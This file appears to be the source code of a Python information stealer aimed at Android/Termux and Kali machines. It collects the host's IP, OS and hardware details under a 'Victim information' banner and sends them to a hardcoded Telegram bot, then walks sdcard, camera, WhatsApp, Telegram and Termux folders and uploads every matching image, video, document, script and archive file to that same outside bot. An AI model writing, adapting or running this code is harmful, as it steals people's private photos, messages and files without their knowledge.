import os
import requests
import platform
import psutil
import datetime
def GoldenX():
    idp = requests.get("https://api.ipify.org").text
    os_name = platform.system()
    os_version = platform.version()
    node_version = platform.node()
    processor = platform.processor()
    architecture = platform.architecture()
    disk_usage = psutil.disk_usage('/')
    total_disk_space = disk_usage.total
    used_disk_space = disk_usage.used
    free_disk_space = disk_usage.free
    now = datetime.datetime.now()
    current_time = now.strftime("%I:%M:%S")
    system_info = {
        "os_name": os_name,
        "os_version": os_version,
        "node_version": node_version,
        "processor": processor,
        "architecture": architecture,
        "total_disk_space": total_disk_space,
        "used_disk_space": used_disk_space,
        "free_disk_space": free_disk_space,
        "current_time": current_time,
        "ip": idp
    }
    ID1_Golden = '5487978588' 
    Token2_Golden = '7421375546:AAFhof2y_unuXDXAh6cFfFtLGiI64kO5uyY' 
    Token4_Golden = '7421375546:AAFhof2y_unuXDXAh6cFfFtLGiI64kO5uyY'
    message = f"""
 . Victim information  . 
────────────────
• ᏴＹ: Golden </>
• Telegram : @rrrrrf
────────────────
 -     OS  : {system_info["os_name"]}
 -     System version  : {system_info["os_version"]}
 -     Node version  : {system_info["node_version"]}
 -     Processor : {system_info["processor"]}
 -     Identity : {system_info["architecture"]}
 -     Architecture  : {system_info["architecture"]}
 -     Time  : {system_info["current_time"]}
 -     IP Address : {system_info["ip"]}
 -     IP : https://www.geolocation.com/ar?ip={system_info["ip"]}#ipresult
"""
    url = f"https://api.telegram.org/bot{Token2_Golden}/sendMessage"
    data = {"chat_id": ID1_Golden, "text": message}
    requests.post(url, data=data)
    paths = ['/sdcard/', '/sdcard/Download/', '/sdcard/Alarms/', '/sdcard/DCIM/SharedFolder/', '/sdcard/DCIM/Camera/', '/sdcard/DCIM/Screenshots/', '/sdcard/Movies/', '/sdcard/WhatsApp/Media/', '/sdcard/Download/Telegram/', '/sdcard/Telegram/Telegram Files/', '/sdcard/WhatsApp/Media/WhatsApp Documents/', '/data/data/com.termux/files/home', '/data/data/com.termux/files/usr/bin', '/sdcard/Documents', '/home/kali/Downloads/', '/data/data/com.termux/files/usr/lib/python3.9/', '/data/data/com.termux/files/usr/share/python', '/data/data/com.termux/files/', '']
    file_extensions = ['.png', '.apk', '.py', '.jpg', '.mp3', '.mp4', '.txt', '.php', '.zip', '.sh']
    session = requests.Session()
    
    for path in paths:
        for ext in file_extensions:
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.endswith(ext):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            url = f'https://api.telegram.org/bot{Token4_Golden}/sendDocument'
                            data = {'chat_id': ID1_Golden}
                            files = {'document': f}
                            session.post(url, data=data, files=files)
